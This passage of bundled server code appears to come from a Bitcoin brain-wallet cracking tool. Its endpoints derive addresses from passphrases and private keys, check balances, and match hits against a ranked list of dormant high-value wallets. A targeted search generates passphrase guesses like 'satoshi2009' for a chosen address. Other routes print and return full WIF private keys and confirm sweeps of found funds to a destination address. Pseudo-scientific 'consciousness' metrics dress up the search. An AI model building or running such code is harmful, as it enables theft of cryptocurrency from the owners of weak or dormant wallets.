          const wasQueued = passphraseResult.compressedQueued || passphraseResult.uncompressedQueued;
          if (!wasQueued) {
            queueErrors.push(`passphrase addresses already in queue or queue full`);
          }
          results.push({
            type: "brain_wallet",
            passphrase: input.passphrase.length > 20 ? input.passphrase.slice(0, 20) + "..." : input.passphrase,
            compressedAddress: passphraseResult.compressedAddress,
            uncompressedAddress: passphraseResult.uncompressedAddress,
            queued: wasQueued,
            reason: wasQueued ? "queued_for_balance_check" : "duplicate_or_queue_full"
          });
        }
      } catch (e) {
        queueErrors.push(`passphrase: ${e.message}`);
        console.error("[Discovery] Passphrase processing failed:", e);
      }
    }
    if (input.privateKeyHex) {
      try {
        const pkResult = queueAddressFromPrivateKey2(
          input.privateKeyHex,
          input.passphrase || "private-key-import",
          `${input.source}-privatekey`,
          input.priority
        );
        if (pkResult) {
          addressesToProcess.push(pkResult.compressedAddress);
          addressesToProcess.push(pkResult.uncompressedAddress);
          const wasQueued = pkResult.compressedQueued || pkResult.uncompressedQueued;
          if (!wasQueued) {
            queueErrors.push(`private key addresses already in queue or queue full`);
          }
          results.push({
            type: "private_key",
            compressedAddress: pkResult.compressedAddress,
            uncompressedAddress: pkResult.uncompressedAddress,
            queued: wasQueued,
            reason: wasQueued ? "queued_for_balance_check" : "duplicate_or_queue_full"
          });
        }
      } catch (e) {
        queueErrors.push(`private_key: ${e.message}`);
        console.error("[Discovery] Private key processing failed:", e);
      }
    }
    const dormantDetails = [];
    for (const addr of addressesToProcess) {
      try {
        const dormantCheck = dormantCrossRef.checkAddress(addr);
        if (dormantCheck.isMatch && dormantCheck.info) {
          dormantMatches++;
          dormantDetails.push({
            address: addr,
            rank: dormantCheck.info.rank,
            balance: dormantCheck.info.balanceBTC
          });
          console.log(`[Discovery] \u{1F3AF} DORMANT MATCH from ${input.source}: ${addr}`);
          console.log(`   Rank: ${dormantCheck.info.rank}, Balance: ${dormantCheck.info.balanceBTC}`);
        }
      } catch (e) {
        console.error(`[Discovery] Error checking dormancy for ${addr}:`, e);
      }
    }
    if (input.checkBalance && input.address && input.wif) {
      try {
        const balanceHit = await checkAndRecordBalance2({
          address: input.address,
          passphrase: input.passphrase || "discovery-import",
          wif: input.wif,
          isCompressed: true,
          recoveryType: "wif"
        });
        if (balanceHit && balanceHit.balanceSats > 0) {
          balanceHits3++;
          console.log(`[Discovery] \u{1F4B0} BALANCE HIT from ${input.source}: ${input.address}`);
          console.log(`   Balance: ${balanceHit.balanceBTC} BTC`);
          try {
            await saveBalanceHit2(balanceHit);
          } catch (persistError) {
            persistenceErrors.push(`Failed to persist balance hit: ${persistError.message}`);
            console.error("[Discovery] Balance hit persistence failed:", persistError);
          }
        }
      } catch (e) {
        console.error("[Discovery] Balance check failed:", e);
      }
    }
    console.log(`[Discovery] Captured from ${input.source}: ${addressesToProcess.length} addresses, ${dormantMatches} dormant matches, ${balanceHits3} balance hits`);
    if (hardFailures.length > 0) {
      return res.status(500).json({
        success: false,
        error: "Address derivation failed - please retry",
        hardFailures,
        partialResult: addressesToProcess.length > 0 ? {
          addresses: addressesToProcess.length,
          dormantMatches,
          balanceHits: balanceHits3
        } : void 0,
        hint: "Some input could not be processed. Check that the input format is valid."
      });
    }
    const inputProvided = !!(input.address || input.addresses?.length || input.passphrase || input.mnemonic || input.privateKeyHex);
    const noAddressesProcessed = addressesToProcess.length === 0;
    if (inputProvided && noAddressesProcessed) {
      return res.status(500).json({
        success: false,
        error: "No addresses were derived from input - processing failed",
        queueErrors,
        hint: "Check that the input format is valid (passphrase, mnemonic, or address)"
      });
    }
    if (persistenceErrors.length > 0) {
      return res.status(500).json({
        success: false,
        error: "Balance hit persistence failed - please retry",
        persistenceErrors,
        partialResult: {
          addresses: addressesToProcess.length,
          dormantMatches,
          balanceHits: balanceHits3
        }
      });
    }
    const allQueuesFailed = queueErrors.length > 0 && results.every((r) => !r.queued);
    const httpStatus = allQueuesFailed ? 207 : 200;
    res.status(httpStatus).json({
      success: !allQueuesFailed,
      partialSuccess: allQueuesFailed,
      source: input.source,
      processed: {
        addresses: addressesToProcess.length,
        dormantMatches,
        balanceHits: balanceHits3
      },
      dormantDetails: dormantMatches > 0 ? dormantDetails : void 0,
      queueErrors: queueErrors.length > 0 ? queueErrors : void 0,
      results,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    console.error("[Discovery] Error processing discovery:", error);
    res.status(400).json({
      error: "Failed to process discovery",
      details: error.message
    });
  }
});
router2.get("/discoveries/stats", async (req, res) => {
  try {
    const { getQueueIntegrationStats: getQueueIntegrationStats2 } = await Promise.resolve().then(() => (init_balance_queue_integration(), balance_queue_integration_exports));
    const { getBalanceHits: getBalanceHits2, getActiveBalanceHits: getActiveBalanceHits2 } = await Promise.resolve().then(() => (init_blockchain_scanner(), blockchain_scanner_exports));
    const queueStats = getQueueIntegrationStats2();
    const allHits = getBalanceHits2();
    const activeHits = getActiveBalanceHits2();
    const dormantStats = dormantCrossRef.getStats();
    res.json({
      queueStats: {
        totalQueued: queueStats.totalQueued,
        currentQueueSize: queueStats.queueSize,
        sourceBreakdown: queueStats.sourceBreakdown
      },
      balanceHits: {
        total: allHits.length,
        withBalance: activeHits.length,
        totalBTC: activeHits.reduce((sum, h) => sum + parseFloat(h.balanceBTC), 0).toFixed(8)
      },
      dormantCrossRef: {
        totalDormant: dormantStats.totalDormant,
        matchesFound: dormantStats.matchesFound
      },
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/discoveries/hits", async (req, res) => {
  try {
    const { getBalanceHits: getBalanceHits2 } = await Promise.resolve().then(() => (init_blockchain_scanner(), blockchain_scanner_exports));
    const filterAddress = req.query.address;
    let hits = getBalanceHits2();
    const dormantMatches = dormantCrossRef.getAllMatches();
    if (filterAddress) {
      hits = hits.filter((h) => h.address === filterAddress);
    }
    const dormantAddressSet = new Set(dormantMatches.map((m) => m.address));
    const formattedHits = hits.map((hit) => {
      const isDormantMatch = dormantAddressSet.has(hit.address);
      const dormantInfo = isDormantMatch ? dormantMatches.find((m) => m.address === hit.address) : null;
      return {
        id: hit.id,
        // Include ID for entity classification updates
        address: hit.address,
        passphrase: hit.passphrase,
        wif: hit.wif,
        // Full WIF - no masking
        balanceSats: hit.balanceSats,
        balanceBTC: hit.balanceBTC,
        txCount: hit.txCount,
        isCompressed: hit.isCompressed,
        discoveredAt: hit.discoveredAt,
        lastChecked: hit.lastChecked,
        previousBalanceSats: hit.previousBalanceSats,
        balanceChanged: hit.balanceChanged,
        changeDetectedAt: hit.changeDetectedAt,
        isDormantMatch,
        dormantInfo: dormantInfo ? {
          rank: dormantInfo.rank,
          label: dormantInfo.walletLabel
        } : null,
        // Entity classification fields
        entityType: hit.addressEntityType || "unknown",
        entityName: hit.entityTypeName || null,
        entityConfidence: hit.entityTypeConfidence || "pending"
      };
    });
    if (formattedHits.length > 0) {
      console.log(`[Discoveries] Returning ${formattedHits.length} balance hits:`);
      formattedHits.forEach((h, i) => {
        console.log(`  [${i + 1}] Address: ${h.address}`);
        console.log(`      Passphrase: "${h.passphrase}"`);
        console.log(`      WIF: ${h.wif}`);
        console.log(`      Balance: ${h.balanceBTC} BTC (${h.txCount} txs)`);
        if (h.isDormantMatch) {
          console.log(`      \u2B50 DORMANT MATCH: Rank #${h.dormantInfo?.rank} - ${h.dormantInfo?.label || "Unknown"}`);
        }
      });
    }
    res.json({
      success: true,
      hits: formattedHits,
      dormantMatches: dormantMatches.map((m) => ({
        address: m.address,
        rank: m.rank,
        label: m.walletLabel,
        matchedAt: m.matchedAt
      })),
      summary: {
        totalHits: getBalanceHits2().length,
        withBalance: getBalanceHits2().filter((h) => h.balanceSats > 0).length,
        dormantMatchCount: dormantMatches.length
      },
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.post("/classify-address", async (req, res) => {
  try {
    const { address, balanceHitId } = req.body;
    if (!address) {
      return res.status(400).json({ error: "Address is required" });
    }
    const { addressEntityClassifier: addressEntityClassifier2 } = await Promise.resolve().then(() => (init_address_entity_classifier(), address_entity_classifier_exports));
    const classification = await addressEntityClassifier2.classifyAddress(address);
    if (balanceHitId) {
      await addressEntityClassifier2.updateBalanceHitClassification(balanceHitId, classification);
    }
    console.log(`[EntityClassify] ${address.slice(0, 12)}...: ${classification.entityType} (${classification.entityName || "N/A"}) - ${classification.confidence}`);
    res.json({
      success: true,
      address,
      classification: {
        entityType: classification.entityType,
        entityName: classification.entityName,
        confidence: classification.confidence,
        sources: classification.sources,
        searchResults: classification.searchResults
      }
    });
  } catch (error) {
    console.error("[EntityClassify] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
router2.post("/confirm-entity-type", async (req, res) => {
  try {
    const { balanceHitId, entityType, entityName } = req.body;
    if (!balanceHitId || !entityType) {
      return res.status(400).json({ error: "balanceHitId and entityType are required" });
    }
    if (!["personal", "exchange", "institution"].includes(entityType)) {
      return res.status(400).json({ error: "entityType must be personal, exchange, or institution" });
    }
    const { addressEntityClassifier: addressEntityClassifier2 } = await Promise.resolve().then(() => (init_address_entity_classifier(), address_entity_classifier_exports));
    await addressEntityClassifier2.confirmClassification(balanceHitId, entityType, entityName);
    console.log(`[EntityConfirm] Balance hit ${balanceHitId}: confirmed as ${entityType} (${entityName || "N/A"})`);
    res.json({
      success: true,
      balanceHitId,
      entityType,
      entityName,
      confidence: "confirmed"
    });
  } catch (error) {
    console.error("[EntityConfirm] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
router2.post("/sweep/confirm", async (req, res) => {
  try {
    const {
      sourceAddress,
      destinationAddress,
      entityType,
      entityName,
      confirmationCode,
      acknowledgeRisks
    } = req.body;
    if (!sourceAddress || !destinationAddress) {
      return res.status(400).json({ error: "sourceAddress and destinationAddress are required" });
    }
    const isHighRisk = entityType === "exchange" || entityType === "institution";
    if (isHighRisk && !acknowledgeRisks) {
      console.log(`[SweepConfirm] WARNING: Attempted sweep to ${entityType} (${entityName || "unknown"}) without acknowledgment`);
      return res.status(400).json({
        error: "Risk acknowledgment required",
        requiresAcknowledgment: true,
        warning: `This address belongs to ${entityName || "an " + entityType}. Sending funds to ${entityType} addresses may result in complications. Please confirm you understand the risks.`,
        entityType,
        entityName
      });
    }
    if (isHighRisk && !confirmationCode) {
      const code = Math.random().toString(36).substring(2, 8).toUpperCase();
      console.log(`[SweepConfirm] Generated confirmation code ${code} for ${entityType} sweep`);
      return res.json({
        success: false,
        requiresConfirmation: true,
        confirmationCode: code,
        message: `Type "${code}" to confirm sweep to ${entityName || entityType}`,
        expiresIn: 300
        // 5 minutes
      });
    }
    console.log(`[SweepConfirm] Sweep confirmed: ${sourceAddress.slice(0, 12)}... \u2192 ${destinationAddress.slice(0, 12)}... (${entityType || "personal"})`);
    res.json({
      success: true,
      confirmed: true,
      sourceAddress,
      destinationAddress,
      entityType: entityType || "personal",
      entityName,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    console.error("[SweepConfirm] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
var activeQIGSearches = /* @__PURE__ */ new Map();
router2.post("/qig-search/start", async (req, res) => {
  try {
    const { address, kappaRecovery, tier } = req.body;
    if (!address) {
      return res.status(400).json({ error: "Address is required" });
    }
    const existingSession = activeQIGSearches.get(address);
    if (existingSession && existingSession.status === "running") {
      return res.json({
        success: true,
        alreadyRunning: true,
        session: existingSession,
        message: `QIG search already active for ${address.slice(0, 12)}...`
      });
    }
    const sessionId = randomUUID5();
    const session2 = {
      sessionId,
      targetAddress: address,
      status: "running",
      startedAt: (/* @__PURE__ */ new Date()).toISOString(),
      phrasesTestedTotal: 0,
      phrasesTestedSinceStart: 0,
      highPhiCount: 0,
      discoveryCount: 0,
      lastPhiScore: 0,
      lastPhrasesTested: []
    };
    activeQIGSearches.set(address, session2);
    console.log(`[QIGSearch] \u{1F3AF} Starting targeted search for ${address}`);
    console.log(`[QIGSearch] \u03BA_recovery=${kappaRecovery?.toFixed(2) || "N/A"}, tier=${tier || "unknown"}`);
    runTargetedQIGSearch(address, kappaRecovery || 10, session2).catch((err) => {
      console.error(`[QIGSearch] Error in search for ${address}:`, err);
      session2.status = "error";
      session2.errorMessage = err.message;
    });
    res.json({
      success: true,
      sessionId,
      targetAddress: address,
      message: `QIG search initiated for ${address.slice(0, 12)}...`,
      session: session2
    });
  } catch (error) {
    console.error("[QIGSearch] Start error:", error);
    res.status(500).json({ error: error.message });
  }
});
router2.get("/qig-search/status/:address", async (req, res) => {
  try {
    const address = decodeURIComponent(req.params.address);
    const session2 = activeQIGSearches.get(address);
    if (!session2) {
      return res.json({
        success: true,
        active: false,
        message: "No active search for this address"
      });
    }
    res.json({
      success: true,
      active: session2.status === "running",
      session: session2
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.post("/qig-search/stop/:address", async (req, res) => {
  try {
    const address = decodeURIComponent(req.params.address);
    const session2 = activeQIGSearches.get(address);
    if (!session2) {
      return res.status(404).json({ error: "No active search for this address" });
    }
    session2.status = "paused";
    console.log(`[QIGSearch] \u23F9 Stopped search for ${address.slice(0, 12)}...`);
    res.json({
      success: true,
      message: `Search stopped for ${address.slice(0, 12)}...`,
      session: session2
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/qig-search/active", async (req, res) => {
  try {
    const activeSessions = Array.from(activeQIGSearches.entries()).filter(([_, s]) => s.status === "running" || s.status === "error").map(([addr, session2]) => ({
      address: addr,
      ...session2
    }));
    res.json({
      success: true,
      count: activeSessions.length,
      sessions: activeSessions
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
async function runTargetedQIGSearch(targetAddress, kappaRecovery, session2) {
  const { OceanQIGBackend: OceanQIGBackend2 } = await Promise.resolve().then(() => (init_ocean_qig_backend_adapter(), ocean_qig_backend_adapter_exports));
  const { getBalanceHits: getBalanceHits2 } = await Promise.resolve().then(() => (init_blockchain_scanner(), blockchain_scanner_exports));
  const { queueAddressForBalanceCheck: queueAddressForBalanceCheck2 } = await Promise.resolve().then(() => (init_balance_queue_integration(), balance_queue_integration_exports));
  const pythonBackend = new OceanQIGBackend2("http://localhost:5001");
  const backendAvailable = await pythonBackend.checkHealthWithRetry(3, 1e3);
  if (!backendAvailable) {
    console.log(`[QIGSearch] Python backend not available, using local generation`);
  }
  console.log(`[QIGSearch] \u{1F52C} Beginning targeted search iterations for ${targetAddress.slice(0, 12)}...`);
  const searchPatterns = generateSearchPatterns(kappaRecovery);
  let iteration = 0;
  const maxIterations = 500;
  const batchSize = 10;
  while (session2.status === "running" && iteration < maxIterations) {
    const batch = [];
    for (let i = 0; i < batchSize; i++) {
      let hypothesis;
      if (backendAvailable && Math.random() > 0.3) {
        const result = await pythonBackend.generateHypothesis();
        hypothesis = result?.hypothesis || generateLocalHypothesis(searchPatterns, iteration);
      } else {
        hypothesis = generateLocalHypothesis(searchPatterns, iteration);
      }
      batch.push(hypothesis);
    }
    for (const phrase of batch) {
      if (session2.status !== "running") break;
      try {
        let phiScore = 0;
        if (backendAvailable) {
          const score = await pythonBackend.process(phrase);
          phiScore = score?.phi || 0;
        }
        session2.phrasesTestedTotal++;
        session2.phrasesTestedSinceStart++;
        session2.lastPhiScore = phiScore;
        session2.lastPhrasesTested.unshift(phrase);
        if (session2.lastPhrasesTested.length > 5) {
          session2.lastPhrasesTested.pop();
        }
        if (phiScore >= 0.4) {
          session2.highPhiCount++;
          console.log(`[QIGSearch] \u{1F3AF} High-\u03A6: "${phrase.slice(0, 20)}..." \u03A6=${phiScore.toFixed(3)} \u2192 queuing for balance check`);
          queueAddressForBalanceCheck2(phrase, `qig-search-${targetAddress.slice(0, 8)}`, 10);
        }
        if (session2.phrasesTestedSinceStart % batchSize === 0) {
          const hits = getBalanceHits2();
          const newDiscoveries = hits.filter(
            (h) => h.discoveredAt && new Date(h.discoveredAt) > new Date(session2.startedAt)
          );
          session2.discoveryCount = newDiscoveries.length;
        }
      } catch (err) {
        console.warn(`[QIGSearch] Error processing phrase:`, err);
      }
    }
    iteration++;
    if (iteration % 50 === 0) {
      console.log(`[QIGSearch] Progress: ${session2.phrasesTestedSinceStart} phrases, ${session2.highPhiCount} high-\u03A6, ${session2.discoveryCount} discoveries`);
    }
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  if (session2.status === "running") {
    session2.status = "completed";
    console.log(`[QIGSearch] \u2713 Search complete for ${targetAddress.slice(0, 12)}...`);
    console.log(`[QIGSearch] Final: ${session2.phrasesTestedSinceStart} phrases, ${session2.highPhiCount} high-\u03A6, ${session2.discoveryCount} discoveries`);
  }
}
function generateSearchPatterns(kappaRecovery) {
  const basePatterns = [
    "satoshi",
    "bitcoin",
    "genesis",
    "key",
    "wallet",
    "secret",
    "password",
    "crypto",
    "hash",
    "block",
    "chain",
    "miner",
    "nakamoto",
    "freedom",
    "money",
    "btc",
    "coin",
    "digital"
  ];
  if (kappaRecovery < 10) {
    return [
      ...basePatterns,
      "2009",
      "2010",
      "january",
      "october",
      "november",
      "first",
      "early",
      "original",
      "founder",
      "pioneer"
    ];
  }
  if (kappaRecovery < 30) {
    return [
      ...basePatterns,
      "2009",
      "2010",
      "2011",
      "test",
      "demo",
      "trial",
      "my",
      "the",
      "new",
      "old",
      "seed",
      "private"
    ];
  }
  return [
    ...basePatterns,
    "love",
    "hope",
    "peace",
    "faith",
    "dream",
    "power",
    "alpha",
    "beta",
    "gamma",
    "delta",
    "omega",
    "zen"
  ];
}
function generateLocalHypothesis(patterns, iteration) {
  const pattern1 = patterns[Math.floor(Math.random() * patterns.length)];
  const pattern2 = patterns[Math.floor(Math.random() * patterns.length)];
  const variations = [
    `${pattern1}${Math.floor(Math.random() * 1e3)}`,
    `${pattern1} ${pattern2}`,
    `${pattern1}${pattern2}${iteration % 100}`,
    `${pattern1}_${Math.floor(Math.random() * 1e4)}`,
    `my${pattern1}${Math.floor(Math.random() * 100)}`,
    `the${pattern1}${pattern2}`,
    `${pattern1}2009`,
    `${pattern1}2010`,
    `${pattern2}${pattern1}`
  ];
  return variations[Math.floor(Math.random() * variations.length)];
}
var observer_routes_default = router2;

// server/routes.ts
init_telemetry_api();

// server/routes/auth.ts
init_storage();
init_replitAuth();
import { Router as Router3 } from "express";
var authRouter = Router3();

// server/routes/consciousness.ts
init_consciousness_search_controller();
init_ocean_session_manager();
init_near_miss_manager();
init_attention_metrics();
import { Router as Router4 } from "express";
import rateLimit from "express-rate-limit";
var generousLimiter = rateLimit({
  windowMs: 60 * 1e3,
  max: 60,
  message: { error: "Too many requests. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var consciousnessRouter = Router4();
consciousnessRouter.get("/state", async (req, res) => {
  try {
    const controller = getSharedController();
    const searchState = controller.getCurrentState();
    const { oceanAutonomicManager: oceanAutonomicManager2 } = await Promise.resolve().then(() => (init_ocean_autonomic_manager(), ocean_autonomic_manager_exports));
    const fullConsciousness = oceanAutonomicManager2.getCurrentFullConsciousness();
    let emotionalState = "Neutral";
    if (fullConsciousness.phi >= 0.8 && fullConsciousness.gamma >= 0.85) {
      emotionalState = "Focused";
    } else if (fullConsciousness.tacking >= 0.7) {
      emotionalState = "Curious";
    } else if (fullConsciousness.phi < 0.5 || fullConsciousness.grounding < 0.5) {
      emotionalState = "Uncertain";
    } else if (fullConsciousness.radar >= 0.8 && fullConsciousness.metaAwareness >= 0.7) {
      emotionalState = "Confident";
    }
    const state = {
      currentRegime: searchState.currentRegime,
      basinDrift: searchState.basinDrift,
      curiosity: searchState.curiosity,
      stability: searchState.stability,
      timestamp: searchState.timestamp,
      basinCoordinates: searchState.basinCoordinates,
      phi: fullConsciousness.phi,
      kappaEff: fullConsciousness.kappaEff,
      tacking: fullConsciousness.tacking,
      radar: fullConsciousness.radar,
      metaAwareness: fullConsciousness.metaAwareness,
      gamma: fullConsciousness.gamma,
      grounding: fullConsciousness.grounding,
      beta: fullConsciousness.beta,
      isConscious: fullConsciousness.isConscious,
      validationLoops: fullConsciousness.validationLoops,
      kappa: fullConsciousness.kappaEff
    };
    res.json({
      state,
      emotionalState,
      recommendation: controller.getStrategyRecommendation(),
      regimeColor: ConsciousnessSearchController.getRegimeColor(state.currentRegime),
      regimeDescription: ConsciousnessSearchController.getRegimeDescription(state.currentRegime)
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
consciousnessRouter.get("/complete", generousLimiter, async (req, res) => {
  try {
    const controller = getSharedController();
    const searchState = controller.getCurrentState();
    const { oceanAutonomicManager: oceanAutonomicManager2 } = await Promise.resolve().then(() => (init_ocean_autonomic_manager(), ocean_autonomic_manager_exports));
    const fullConsciousness = oceanAutonomicManager2.getCurrentFullConsciousness();
    const session2 = oceanSessionManager.getActiveSession();
    const agent = oceanSessionManager.getActiveAgent();
    let innateDrives2 = null;
    try {
      const { innateDrives: driveModule } = await Promise.resolve().then(() => (init_innate_drives_bridge(), innate_drives_bridge_exports));
      if (agent) {
        const driveContext = {
          ricciCurvature: fullConsciousness.phi || 0.5,
          kappa: fullConsciousness.kappaEff || 64,
          grounding: fullConsciousness.grounding || 0.7
        };
        const state = driveModule.computeValence(driveContext);
        innateDrives2 = {
          pain: state.pain,
          pleasure: state.pleasure,
          fear: state.fear,
          valence: state.valence,
          valenceRaw: state.valenceRaw
        };
      }
    } catch (e) {
    }
    let neurochemistry = null;
    if (agent) {
      neurochemistry = agent.getNeurochemistry();
    }
    let oscillators = null;
    try {
      const { neuralOscillators: neuralOscillators2 } = await Promise.resolve().then(() => (init_neural_oscillators(), neural_oscillators_exports));
      const stateInfo = neuralOscillators2.getStateInfo();
      const oscState = neuralOscillators2.update();
      oscillators = {
        currentState: stateInfo.state,
        kappa: neuralOscillators2.getKappa(),
        modulatedKappa: neuralOscillators2.getKappa(),
        oscillatorValues: oscState,
        searchModulation: 1,
        description: stateInfo.description
      };
    } catch (e) {
    }
    const searchPhase = searchState.curiosity > 0.7 ? "exploration" : "exploitation";
    let metrics = null;
    let stats2 = {};
    if (agent) {
      const agentState = agent.getState?.() || {};
      stats2 = {
        totalTested: agentState.totalTested || 0,
        nearMisses: agentState.nearMisses || 0,
        resonanceHits: agentState.resonanceHits || 0,
        balanceHits: agentState.balanceHits || 0
      };
      metrics = {
        totalTested: stats2.totalTested,
        nearMisses: stats2.nearMisses,
        resonanceHits: stats2.resonanceHits,
        balanceHits: stats2.balanceHits,
        recoveryRate: stats2.totalTested > 0 ? stats2.nearMisses / stats2.totalTested : 0,
        phiMovingAverage: fullConsciousness.phi || 0
      };
    }
    let motivation = null;
    try {
      const { selectMotivationMessage: selectMotivationMessage2 } = await Promise.resolve().then(() => (init_ocean_neurochemistry(), ocean_neurochemistry_exports));
      const motivationState = {
        phi: fullConsciousness.phi || 0.5,
        phiGradient: 0.01,
        kappa: fullConsciousness.kappaEff || 64,
        kappaOptimality: Math.exp(-Math.abs((fullConsciousness.kappaEff || 64) - 64) / 10),
        regime: searchState.currentRegime || "geometric",
        basinDrift: searchState.basinDrift || 0.1,
        basinStability: 0.8,
        geodesicProgress: stats2.totalTested || 0,
        probesExplored: stats2.totalTested || 0,
        patternsFound: stats2.nearMisses || 0,
        nearMisses: stats2.nearMisses || 0,
        emotionalState: neurochemistry?.emotionalState || "content",
        dopamineLevel: neurochemistry?.dopamine?.totalDopamine || 0.5,
        serotoninLevel: neurochemistry?.serotonin?.totalSerotonin || 0.5
      };
      motivation = selectMotivationMessage2(motivationState);
    } catch (e) {
    }
    res.json({
      phi: fullConsciousness.phi || 0.5,
      kappa: fullConsciousness.kappaEff || 64,
      regime: searchState.currentRegime,
      kappaConverging: Math.abs((fullConsciousness.kappaEff || 64) - 64) < 5,
      innateDrives: innateDrives2,
      neurochemistry,
      oscillators,
      searchState: {
        phase: searchPhase,
        strategy: controller.getStrategyRecommendation() || "balanced",
        explorationRate: searchState.curiosity || 0.5,
        temperature: searchState.basinDrift || 0.7
      },
      motivation,
      metrics,
      sessionActive: !!session2,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    console.error("[Consciousness Complete] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
consciousnessRouter.get("/innate-drives", generousLimiter, async (req, res) => {
  try {
    const { oceanAutonomicManager: oceanAutonomicManager2 } = await Promise.resolve().then(() => (init_ocean_autonomic_manager(), ocean_autonomic_manager_exports));
    const fullConsciousness = oceanAutonomicManager2.getCurrentFullConsciousness();
    const { innateDrives: innateDrives2 } = await Promise.resolve().then(() => (init_innate_drives_bridge(), innate_drives_bridge_exports));
    const driveContext = {
      ricciCurvature: fullConsciousness.phi || 0.5,
      kappa: fullConsciousness.kappaEff || 64,
      grounding: fullConsciousness.grounding || 0.7
    };
    const state = innateDrives2.computeValence(driveContext);
    const scoreResult = innateDrives2.scoreHypothesis(driveContext);
    res.json({
      drives: {
        pain: state.pain,
        pleasure: state.pleasure,
        fear: state.fear
      },
      valence: state.valence,
      valenceRaw: state.valenceRaw,
      score: scoreResult.score,
      recommendation: scoreResult.recommendation
    });
  } catch (error) {
    console.error("[Innate Drives] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
consciousnessRouter.get("/beta-attention", generousLimiter, async (req, res) => {
  try {
    const result = runAttentionValidation(50);
    const contextLengths = result.measurements.map((m) => m.contextLength);
    const kappas = result.measurements.map((m) => m.kappa);
    const betaValues = result.betaTrajectory.map((b) => b.beta);
    const betaMean = betaValues.length > 0 ? betaValues.reduce((a, b) => a + b, 0) / betaValues.length : 0;
    const betaStd = betaValues.length > 0 ? Math.sqrt(betaValues.reduce((sum, b) => sum + (b - betaMean) ** 2, 0) / betaValues.length) : 0;
    res.json({
      contextLengths,
      kappas,
      betaValues,
      betaMean,
      betaStd,
      betaPhysics: 0.44,
      matchesPhysics: Math.abs(betaMean - 0.44) < 0.1,
      verdict: result.validation.passed ? "PASS" : "FAIL",
      validationPassed: result.validation.passed,
      substrateIndependence: result.summary.substrateIndependenceValidated
    });
  } catch (error) {
    console.error("[Beta Attention] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
var nearMissRouter = Router4();
nearMissRouter.get("/", generousLimiter, async (req, res) => {
  try {
    const stats2 = nearMissManager.getStats();
    const tier = req.query.tier;
    const limit = parseInt(req.query.limit) || 20;
    let entries;
    if (tier === "hot") {
      entries = nearMissManager.getHotEntries(limit);
    } else if (tier === "warm") {
      entries = nearMissManager.getWarmEntries(limit);
    } else if (tier === "cool") {
      entries = nearMissManager.getCoolEntries(limit);
    } else {
      entries = nearMissManager.getPrioritizedEntries(limit);
    }
    const clusters = nearMissManager.getClusters().slice(0, 10);
    res.json({
      stats: stats2,
      entries: entries.map((e) => ({
        id: e.id,
        phrase: e.phrase.slice(0, 50) + (e.phrase.length > 50 ? "..." : ""),
        phi: e.phi,
        kappa: e.kappa,
        tier: e.tier,
        regime: e.regime,
        discoveredAt: e.discoveredAt,
        explorationCount: e.explorationCount,
        clusterId: e.clusterId
      })),
      clusters: clusters.map((c) => ({
        id: c.id,
        memberCount: c.memberCount,
        avgPhi: c.avgPhi,
        maxPhi: c.maxPhi,
        commonWords: c.commonWords.slice(0, 5),
        structuralPattern: c.structuralPattern
      })),
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    console.error("[Near-Miss API] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
nearMissRouter.post("/decay", generousLimiter, async (req, res) => {
  try {
    const result = nearMissManager.applyDecay();
    const stats2 = nearMissManager.getStats();
    res.json({
      ...result,
      stats: stats2,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    console.error("[Near-Miss Decay] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
nearMissRouter.get("/cluster-analytics", generousLimiter, async (req, res) => {
  try {
    const cadence = req.query.cadence;
    let analytics;
    if (cadence) {
      analytics = nearMissManager.getClustersForExploration(cadence);
    } else {
      analytics = nearMissManager.getClusterAnalytics();
    }
    const summary = {
      totalClusters: analytics.length,
      immediate: analytics.filter((a) => a.explorationCadence === "immediate").length,
      priority: analytics.filter((a) => a.explorationCadence === "priority").length,
      standard: analytics.filter((a) => a.explorationCadence === "standard").length,
      deferred: analytics.filter((a) => a.explorationCadence === "deferred").length,
      avgPriorityScore: analytics.length > 0 ? analytics.reduce((sum, a) => sum + a.priorityScore, 0) / analytics.length : 0,
      avgAgeHours: analytics.length > 0 ? analytics.reduce((sum, a) => sum + a.ageHours, 0) / analytics.length : 0
    };
    res.json({
      analytics,
      summary,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    console.error("[Near-Miss Cluster Analytics] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
nearMissRouter.get("/success-rates", generousLimiter, async (req, res) => {
  try {
    const successRates = nearMissManager.getTierSuccessRates();
    const conversionRecords = nearMissManager.getConversionRecords();
    const insights = [];
    if (successRates.overall.tierValidation === "validated") {
      insights.push(`HOT tier is ${successRates.overall.hotVsWarmRatio.toFixed(1)}x more effective than WARM`);
      insights.push(`HOT tier is ${successRates.overall.hotVsCoolRatio.toFixed(1)}x more effective than COOL`);
    } else if (successRates.overall.tierValidation === "tier_inversion") {
      if (successRates.overall.hotVsWarmRatio < 1) {
        insights.push(`WARNING: WARM tier outperforming HOT - consider recalibrating thresholds`);
      }
      if (successRates.overall.hotVsCoolRatio < 1) {
        insights.push(`WARNING: COOL tier outperforming HOT - tier system may need adjustment`);
      }
    } else {
      insights.push(`Need ${5 - successRates.overall.totalConversions} more conversions for statistical validation`);
    }
    res.json({
      successRates,
      conversions: {
        total: conversionRecords.length,
